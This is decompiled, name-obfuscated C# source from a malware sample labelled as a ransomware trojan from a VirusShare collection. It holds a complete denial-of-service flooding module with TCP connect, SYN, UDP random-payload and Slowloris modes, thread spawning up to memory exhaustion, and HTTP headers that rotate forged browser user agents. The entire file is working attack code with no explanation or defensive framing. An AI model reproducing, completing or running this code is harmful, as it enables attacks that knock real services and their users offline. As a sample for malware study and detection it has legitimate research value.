// Decompiled with JetBrains decompiler
// Type: ր֬ᏉṢᡄẼ஗ᱻసҡƬོᒉࢲʗᎎཛྷ.ྐፐᚫੵ᫇Ṵ຅᪶ḋጮᡕ
// Assembly: update, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 7E0159D6-932F-4F32-8DCB-751F61B22DA0
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00040-msil\HEUR-Trojan-Ransom.MSIL.Foreign.gen-1e13fd2b44573360e0d5f6cc2d3a4e1161d119837d808fac0c43885d53ec395f.exe

using System;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using ր֬ᏉṢᡄẼ\u0B97ᱻసҡƬོᒉࢲʗᎎཛྷ;

namespace ր֬ᏉṢᡄẼ\u0B97ᱻసҡƬོᒉࢲʗᎎཛྷ
{
  internal class \u0F90ፐᚫੵ\u1AC7Ṵ\u0E85᪶ḋጮᡕ
  {
    private static \u0F90ፐᚫੵ\u1AC7Ṵ\u0E85᪶ḋጮᡕ.ᄤ\u0DC7ॠᔣຝᯈřဣҍᛊᒁזຂݸۉၥɟ ኛւᛍ\u066Bᄠũ͌߂࿆;
    private static bool ح᩵Ểᅗᖆࣴ\u0B7Cᄖូ\u0E61\u088BἮІ൩ਦố;
    private static string Ғ᪲యŖᯇᒕݎଞᙱᷚల;
    private static int Ӱปះ\u05FDከ\u089C;
    private static int ᝦڭᣡᅖ႘;
    private static int ŭঈþክżॣ;
    private static int ᆎኾ\u1DF9\u0C50Ζᚋথנ\u1774عṕਗ਼ẊඨዌEငᤰ;
    private static Ⴇᘆ៨\u171Eၹᑬ\u1CAA\u1CAF Ӎ\u0964ݫܽ\u0AF1ज़\u1AD7ᵢᩙ\u0B0Dُឱ;
    private static string[] ᑶ\u0FECᄟᅲར\u0B76ɦ\u1B5CḶᨡἲs\u19CCۼᅍ = new string[28]
    {
      "(compatible; MSIE 6.0; Windows NT)",
      "(Macintosh; U; Intel Mac OS X 10.4; en-US; rv:1.9b5) Gecko/2008032619 Firefox/3.0b5",
      "(Windows; U; Windows NT 5.1; en-US; rv:1.8.0.5) Gecko/20060731 Firefox/1.5.0.5 Flock/0.7.4.1 ",
      "(MobilePhone SCP-5500/US/1.0) NetFront/3.0 MMP/2.0 (compatible; Googlebot/2.1; http://www.google.com/bot.html)",
      "[en] (WinNT; U)",
      "(compatible; MSIE 7.0; Windows NT 5.1; bgft) ",
      "(compatible; MSIE 6.0; Win32)",
      "(X11; U; Linux 2.4.2-2 i586; en-US; m18) Gecko/20010131 Netscape6/6.01",
      "(X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801",
      "(SunOS 5.8 sun4u; U) Opera 5.0 [en]",
      "(compatible; Googlebot/2.1; http://www.google.com/bot.html)  ",
      "(X11; U; Linux i686; en-US; rv:1.8) Gecko/20051111 Firefox/1.5 BAVM/1.0.0",
      "(X11; U; Linux i686; en-US; rv:1.9.1a2pre) Gecko/2008073000 Shredder/3.0a2pre ThunderBrowse/3.2.1.8 ",
      "(Windows; U; Windows NT 6.1; it; rv:1.9.2) Gecko/20100115 Firefox/3.6",
      "Galeon/1.2.0 (X11; Linux i686; U;) Gecko/20020326",
      "(Windows NT 5.1; U; en) Presto/2.5.22 Version/10.50",
      "(Windows NT 5.2; U; en) Presto/2.2.15 Version/10.10",
      "(X11; Linux x86_64; U; Linux Mint; en) Presto/2.2.15 Version/10.10",
      "(Macintosh; PPC Mac OS X; U; en) Opera 8.0",
      "(Windows; U; Windows NT 5.1; en-US; rv:0.9.6) Gecko/20011128",
      "(Windows; U; Windows NT 5.1; en-US) AppleWebKit/531.21.8 (KHTML, like Gecko) Version/4.0.4 Safari/531.21.10",
      "(iPhone; U; CPU like Mac OS X; en) AppleWebKit/420.1 (KHTML, like Gecko) Version/3.0 Mobile/4A93 Safari/419.3",
      "(compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET CLR 4.0.20402; MS-RTC LM 8)",
      "(Windows; U; MSIE 7.0; Windows NT 6.0; en-US)",
      "(compatible; MSIE 6.1; Windows XP; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
      "(compatible; MSIE 8.0; Windows NT 6.2; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)",
      "(compatible; MSIE 6.1; Windows XP)",
      "(Windows; U; Windows NT 6.1; nl; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3"
    };
    private static string[] \u0DE1ू်ᢼသҖሡਣ\u0B80ጇ\u02F4\u07FFᡩ\u0E8B = new string[10]
    {
      "Mozilla/3.0 ",
      "Mozilla/3.1 ",
      "Mozilla/3.6 ",
      "Mozilla/4.0 ",
      "Mozilla/4.08 ",
      "Mozilla/5.0 ",
      "Opera/9.33 ",
      "Opera/9.0 ",
      "Opera/8.90 ",
      "Opera/9.80 "
    };

    public static \u0F90ፐᚫੵ\u1AC7Ṵ\u0E85᪶ḋጮᡕ.ᄤ\u0DC7ॠᔣຝᯈřဣҍᛊᒁזຂݸۉၥɟ Ḗ\u0088\u08D5ᖲདᰳ\u061Dᙻ => \u0F90ፐᚫੵ\u1AC7Ṵ\u0E85᪶ḋጮᡕ.ኛւᛍ\u066Bᄠũ͌߂࿆;

    public static string Ꮊᖼऄᖡᖲാიᶺ
    {
      get
      {
        switch (\u0F90ፐᚫੵ\u1AC7Ṵ\u0E85᪶ḋጮᡕ.ኛւᛍ\u066Bᄠũ͌߂࿆)
        {
          case \u0F90ፐᚫੵ\u1AC7Ṵ\u0E85᪶ḋጮᡕ.ᄤ\u0DC7ॠᔣຝᯈřဣҍᛊᒁזຂݸۉၥɟ.\u0897\u0C78ǊᕕḵӖ\u0FDFᴋۻ:
            return "TCP";
          case \u0F90ፐᚫੵ\u1AC7Ṵ\u0E85᪶ḋጮᡕ.ᄤ\u0DC7ॠᔣຝᯈřဣҍᛊᒁזຂݸۉၥɟ.ᮚ\u0881ᦧ\u02F3ྪ\u000Eญ:
            return "SYN";
          case \u0F90ፐᚫੵ\u1AC7Ṵ\u0E85᪶ḋጮᡕ.ᄤ\u0DC7ॠᔣຝᯈřဣҍᛊᒁזຂݸۉၥɟ.\u106Bᄘʯᡂಈᡞ\u0BACǲ\u1ADD᷿ΞʪҶ:
            return "UDP";
          case \u0F90ፐᚫੵ\u1AC7Ṵ\u0E85᪶ḋጮᡕ.ᄤ\u0DC7ॠᔣຝᯈřဣҍᛊᒁזຂݸۉၥɟ.\u0095ᶶ\u0FD1ȓᡈᬎ:
            return "Slowloris";
          default:
            return (string) null;
        }
      }
    }

    public static bool ᕧኝᒏٙᅧJᗃୋ້ᬷᛩ\u1805༧ᩊᰔᑊᤪ៩ => \u0F90ፐᚫੵ\u1AC7Ṵ\u0E85᪶ḋጮᡕ.ح᩵Ểᅗᖆࣴ\u0B7Cᄖូ\u0E61\u088BἮІ൩ਦố;

    public static void ᔂṂᓦ्ͩॊᶵ\u0A57(
      \u0F90ፐᚫੵ\u1AC7Ṵ\u0E85᪶ḋጮᡕ.ᄤ\u0DC7ॠᔣຝᯈřဣҍᛊᒁזຂݸۉၥɟ _param0,
      string _param1,
      int _param2,
      int _param3,
      int _param4,
      int ഽছȝɻᓑᴓ,
      Ⴇᘆ៨\u171Eၹᑬ\u1CAA\u1CAF _param6)
    {
      \u0F90ፐᚫੵ\u1AC7Ṵ\u0E85᪶ḋጮᡕ.ኛւᛍ\u066Bᄠũ͌߂࿆ = _param0;
      \u0F90ፐᚫੵ\u1AC7Ṵ\u0E85᪶ḋጮᡕ.Ғ᪲యŖᯇᒕݎଞᙱᷚల = _param1;
      \u0F90ፐᚫੵ\u1AC7Ṵ\u0E85᪶ḋጮᡕ.Ӱปះ\u05FDከ\u089C = _param2;
      \u0F90ፐᚫੵ\u1AC7Ṵ\u0E85᪶ḋጮᡕ.ᝦڭᣡᅖ႘ = _param3;
      \u0F90ፐᚫੵ\u1AC7Ṵ\u0E85᪶ḋጮᡕ.ᆎኾ\u1DF9\u0C50Ζᚋথנ\u1774عṕਗ਼ẊඨዌEငᤰ = _param4;
      \u0F90ፐᚫੵ\u1AC7Ṵ\u0E85᪶ḋጮᡕ.ŭঈþክżॣ = ഽছȝɻᓑᴓ;
      \u0F90ፐᚫੵ\u1AC7Ṵ\u0E85᪶ḋጮᡕ.Ӎ\u0964ݫܽ\u0AF1ज़\u1AD7ᵢᩙ\u0B0Dُឱ = _param6;
      \u0F90ፐᚫੵ\u1AC7Ṵ\u0E85᪶ḋጮᡕ.ح᩵Ểᅗᖆࣴ\u0B7Cᄖូ\u0E61\u088BἮІ൩ਦố = false;
    }

    public static void ᝯᣱᗈ\u139E\u0DBEᯭᐨᴾᕢ᱔()
    {
      \u0F90ፐᚫੵ\u1AC7Ṵ\u0E85᪶ḋጮᡕ.ح᩵Ểᅗᖆࣴ\u0B7Cᄖូ\u0E61\u088BἮІ൩ਦố = true;
      new Thread(new ThreadStart(\u0F90ፐᚫੵ\u1AC7Ṵ\u0E85᪶ḋጮᡕ.\u0E6BबᜦќེჁᯀវႾݩ)).Start();
    }

    public static void \u0325\u0588\u0D80ᡥჰ() => \u0F90ፐᚫੵ\u1AC7Ṵ\u0E85᪶ḋጮᡕ.ح᩵Ểᅗᖆࣴ\u0B7Cᄖូ\u0E61\u088BἮІ൩ਦố = false;

    private static void \u0E6BबᜦќེჁᯀវႾݩ()
    {
      for (int index = 0; index < \u0F90ፐᚫੵ\u1AC7Ṵ\u0E85᪶ḋጮᡕ.ᝦڭᣡᅖ႘; ++index)
      {
        try
        {
          new Thread(new ThreadStart(\u0F90ፐᚫੵ\u1AC7Ṵ\u0E85᪶ḋጮᡕ.\u1038ࠀҺ\u08BCಱ))
          {
            IsBackground = true
          }.Start();
        }
        catch (OutOfMemoryException ex)
        {
          \u0F90ፐᚫੵ\u1AC7Ṵ\u0E85᪶ḋጮᡕ.ᝦڭᣡᅖ႘ = index - 1;
          break;
        }
      }
    }

    private static void \u1038ࠀҺ\u08BCಱ()
    {
      int num = 0;
      while (\u0F90ፐᚫੵ\u1AC7Ṵ\u0E85᪶ḋጮᡕ.ح᩵Ểᅗᖆࣴ\u0B7Cᄖូ\u0E61\u088BἮІ൩ਦố && \u0F90ፐᚫੵ\u1AC7Ṵ\u0E85᪶ḋጮᡕ.Ӎ\u0964ݫܽ\u0AF1ज़\u1AD7ᵢᩙ\u0B0Dُឱ.Ϸڂ\u0DF9ჰ᷉\u1B7CŁӰਲ਼ɃᜉᎭᄱ\u19FBᒚ\u0B84෦ӹဟ)
      {
        switch (\u0F90ፐᚫੵ\u1AC7Ṵ\u0E85᪶ḋጮᡕ.ኛւᛍ\u066Bᄠũ͌߂࿆)
        {
          case \u0F90ፐᚫੵ\u1AC7Ṵ\u0E85᪶ḋጮᡕ.ᄤ\u0DC7ॠᔣຝᯈřဣҍᛊᒁזຂݸۉၥɟ.\u0897\u0C78ǊᕕḵӖ\u0FDFᴋۻ:
            Socket socket1 = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            socket1.Blocking = false;
            while (num < \u0F90ፐᚫੵ\u1AC7Ṵ\u0E85᪶ḋጮᡕ.ᆎኾ\u1DF9\u0C50Ζᚋথנ\u1774عṕਗ਼ẊඨዌEငᤰ && \u0F90ፐᚫੵ\u1AC7Ṵ\u0E85᪶ḋጮᡕ.ح᩵Ểᅗᖆࣴ\u0B7Cᄖូ\u0E61\u088BἮІ൩ਦố)
            {
              if (\u0F90ፐᚫੵ\u1AC7Ṵ\u0E85᪶ḋጮᡕ.Ӎ\u0964ݫܽ\u0AF1ज़\u1AD7ᵢᩙ\u0B0Dُឱ.Ϸڂ\u0DF9ჰ᷉\u1B7CŁӰਲ਼ɃᜉᎭᄱ\u19FBᒚ\u0B84෦ӹဟ)
              {
                try
                {
                  socket1.Connect(\u0F90ፐᚫੵ\u1AC7Ṵ\u0E85᪶ḋጮᡕ.Ғ᪲యŖᯇᒕݎଞᙱᷚల, \u0F90ፐᚫੵ\u1AC7Ṵ\u0E85᪶ḋጮᡕ.Ӱปះ\u05FDከ\u089C);
                  socket1.Send(\u0F90ፐᚫੵ\u1AC7Ṵ\u0E85᪶ḋጮᡕ.\u00B3ڢ̬ᦰỂ\u060A\u02E8ᦿ\u0ECFṵᰞᜒޜᝠඡยᵽ\u0016());
                  socket1.Close();
                  socket1 = (Socket) null;
                }
                catch
                {
                  socket1.Close();
                  break;
                }
                ++num;
                Thread.Sleep(1);
              }
              else
                break;
            }
            Thread.Sleep(\u0F90ፐᚫੵ\u1AC7Ṵ\u0E85᪶ḋጮᡕ.ŭঈþክżॣ);
            break;
          case \u0F90ፐᚫੵ\u1AC7Ṵ\u0E85᪶ḋጮᡕ.ᄤ\u0DC7ॠᔣຝᯈřဣҍᛊᒁזຂݸۉၥɟ.ᮚ\u0881ᦧ\u02F3ྪ\u000Eญ:
            Socket socket2 = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            socket2.Blocking = false;
            try
            {
              socket2.BeginConnect(\u0F90ፐᚫੵ\u1AC7Ṵ\u0E85᪶ḋጮᡕ.Ғ᪲యŖᯇᒕݎଞᙱᷚల, \u0F90ፐᚫੵ\u1AC7Ṵ\u0E85᪶ḋጮᡕ.Ӱปះ\u05FDከ\u089C, new AsyncCallback(\u0F90ፐᚫੵ\u1AC7Ṵ\u0E85᪶ḋጮᡕ.ḹ༙ᙩ૧ుἣ), (object) null);
            }
            catch
            {
            }
            Thread.Sleep(100);
            try
            {
              if (socket2.Connected)
                socket2.Disconnect(false);
              socket2.Close();
            }
            catch
            {
            }
            Thread.Sleep(\u0F90ፐᚫੵ\u1AC7Ṵ\u0E85᪶ḋጮᡕ.ŭঈþክżॣ);
            break;
          case \u0F90ፐᚫੵ\u1AC7Ṵ\u0E85᪶ḋጮᡕ.ᄤ\u0DC7ॠᔣຝᯈřဣҍᛊᒁזຂݸۉၥɟ.\u106Bᄘʯᡂಈᡞ\u0BACǲ\u1ADD᷿ΞʪҶ:
            Socket socket3 = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
            socket3.Blocking = false;
            Socket socket4;
            try
            {
              socket3.Connect(\u0F90ፐᚫੵ\u1AC7Ṵ\u0E85᪶ḋጮᡕ.Ғ᪲యŖᯇᒕݎଞᙱᷚల, \u0F90ፐᚫੵ\u1AC7Ṵ\u0E85᪶ḋጮᡕ.Ӱปះ\u05FDከ\u089C);
              while (num < \u0F90ፐᚫੵ\u1AC7Ṵ\u0E85᪶ḋጮᡕ.ᆎኾ\u1DF9\u0C50Ζᚋথנ\u1774عṕਗ਼ẊඨዌEငᤰ && \u0F90ፐᚫੵ\u1AC7Ṵ\u0E85᪶ḋጮᡕ.ح᩵Ểᅗᖆࣴ\u0B7Cᄖូ\u0E61\u088BἮІ൩ਦố && \u0F90ፐᚫੵ\u1AC7Ṵ\u0E85᪶ḋጮᡕ.Ӎ\u0964ݫܽ\u0AF1ज़\u1AD7ᵢᩙ\u0B0Dُឱ.Ϸڂ\u0DF9ჰ᷉\u1B7CŁӰਲ਼ɃᜉᎭᄱ\u19FBᒚ\u0B84෦ӹဟ)
              {
                socket3.Send(\u0F90ፐᚫੵ\u1AC7Ṵ\u0E85᪶ḋጮᡕ.\u1BB9ᖬ\u03F6ࠜ\u0ADDǲ());
                ++num;
                Thread.Sleep(1);
              }
              socket3.Close();
              socket4 = (Socket) null;
            }
            catch
            {
              socket3.Close();
              socket4 = (Socket) null;
              break;
            }
            Thread.Sleep(\u0F90ፐᚫੵ\u1AC7Ṵ\u0E85᪶ḋጮᡕ.ŭঈþክżॣ);
            break;
          case \u0F90ፐᚫੵ\u1AC7Ṵ\u0E85᪶ḋጮᡕ.ᄤ\u0DC7ॠᔣຝᯈřဣҍᛊᒁזຂݸۉၥɟ.\u0095ᶶ\u0FD1ȓᡈᬎ:
            Socket socket5 = (Socket) null;
            try
            {
              socket5 = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
              socket5.Connect(\u0F90ፐᚫੵ\u1AC7Ṵ\u0E85᪶ḋጮᡕ.Ғ᪲యŖᯇᒕݎଞᙱᷚల, \u0F90ፐᚫੵ\u1AC7Ṵ\u0E85᪶ḋጮᡕ.Ӱปះ\u05FDከ\u089C);
              socket5.Send(\u0F90ፐᚫੵ\u1AC7Ṵ\u0E85᪶ḋጮᡕ.ಉ࡛࠙ᜆᵿᣊไᯟ\u0874ၛ\u0FD2ሹṛḚ());
              while (socket5.Connected)
              {
                if (\u0F90ፐᚫੵ\u1AC7Ṵ\u0E85᪶ḋጮᡕ.ح᩵Ểᅗᖆࣴ\u0B7Cᄖូ\u0E61\u088BἮІ൩ਦố)
                {
                  if (\u0F90ፐᚫੵ\u1AC7Ṵ\u0E85᪶ḋጮᡕ.Ӎ\u0964ݫܽ\u0AF1ज़\u1AD7ᵢᩙ\u0B0Dُឱ.Ϸڂ\u0DF9ჰ᷉\u1B7CŁӰਲ਼ɃᜉᎭᄱ\u19FBᒚ\u0B84෦ӹဟ)
                  {
                    socket5.Send(\u0F90ፐᚫੵ\u1AC7Ṵ\u0E85᪶ḋጮᡕ.ಉ࡛࠙ᜆᵿᣊไᯟ\u0874ၛ\u0FD2ሹṛḚ());
                    Thread.Sleep(2000);
                  }
                  else
                    break;
                }
                else
                  break;
              }
            }
            catch
            {
              socket5.Close();
            }
            Thread.Sleep(\u0F90ፐᚫੵ\u1AC7Ṵ\u0E85᪶ḋጮᡕ.ŭঈþክżॣ);
            break;
        }
        num = 0;
      }
      if (!\u0F90ፐᚫੵ\u1AC7Ṵ\u0E85᪶ḋጮᡕ.ح᩵Ểᅗᖆࣴ\u0B7Cᄖូ\u0E61\u088BἮІ൩ਦố)
        return;
      \u0F90ፐᚫੵ\u1AC7Ṵ\u0E85᪶ḋጮᡕ.\u0325\u0588\u0D80ᡥჰ();
    }

    private static void ḹ༙ᙩ૧ుἣ(IAsyncResult _param0)
    {
    }

    private static byte[] \u1BB9ᖬ\u03F6ࠜ\u0ADDǲ()
    {
      Random random = new Random();
      byte[] buffer = new byte[random.Next(1470, 65507)];
      random.NextBytes(buffer);
      return buffer;
    }

    private static byte[] \u00B3ڢ̬ᦰỂ\u060A\u02E8ᦿ\u0ECFṵᰞᜒޜᝠඡยᵽ\u0016()
    {
      Random random = new Random();
      byte[] buffer = new byte[random.Next(1470, (int) ushort.MaxValue)];
      random.NextBytes(buffer);
      return buffer;
    }

    private static byte[] ಉ࡛࠙ᜆᵿᣊไᯟ\u0874ၛ\u0FD2ሹṛḚ()
    {
      Random random = new Random();
      StringBuilder stringBuilder = new StringBuilder();
      stringBuilder.AppendLine("GET / HTTP/1.1");
      stringBuilder.AppendLine("Host: " + \u0F90ፐᚫੵ\u1AC7Ṵ\u0E85᪶ḋጮᡕ.Ғ᪲యŖᯇᒕݎଞᙱᷚల);
      stringBuilder.AppendLine("User-Agent: " + \u0F90ፐᚫੵ\u1AC7Ṵ\u0E85᪶ḋጮᡕ.\u0DE1ू်ᢼသҖሡਣ\u0B80ጇ\u02F4\u07FFᡩ\u0E8B[random.Next(0, \u0F90ፐᚫੵ\u1AC7Ṵ\u0E85᪶ḋጮᡕ.\u0DE1ू်ᢼသҖሡਣ\u0B80ጇ\u02F4\u07FFᡩ\u0E8B.Length - 1)] + " " + \u0F90ፐᚫੵ\u1AC7Ṵ\u0E85᪶ḋጮᡕ.ᑶ\u0FECᄟᅲར\u0B76ɦ\u1B5CḶᨡἲs\u19CCۼᅍ[random.Next(0, \u0F90ፐᚫੵ\u1AC7Ṵ\u0E85᪶ḋጮᡕ.ᑶ\u0FECᄟᅲར\u0B76ɦ\u1B5CḶᨡἲs\u19CCۼᅍ.Length - 1)]);
      stringBuilder.AppendLine("Content-Length: " + random.Next(1, 1000).ToString());
      stringBuilder.AppendLine("X-a: " + random.Next(1, 10000).ToString());
      stringBuilder.Append("Connection: keep-alive");
      return Encoding.ASCII.GetBytes(stringBuilder.ToString());
    }

    public enum ᄤ\u0DC7ॠᔣຝᯈřဣҍᛊᒁזຂݸۉၥɟ
    {
      \u0897\u0C78ǊᕕḵӖ\u0FDFᴋۻ,
      ᮚ\u0881ᦧ\u02F3ྪ\u000Eญ,
      \u106Bᄘʯᡂಈᡞ\u0BACǲ\u1ADD᷿ΞʪҶ,
      \u0095ᶶ\u0FD1ȓᡈᬎ,
    }
  }
}
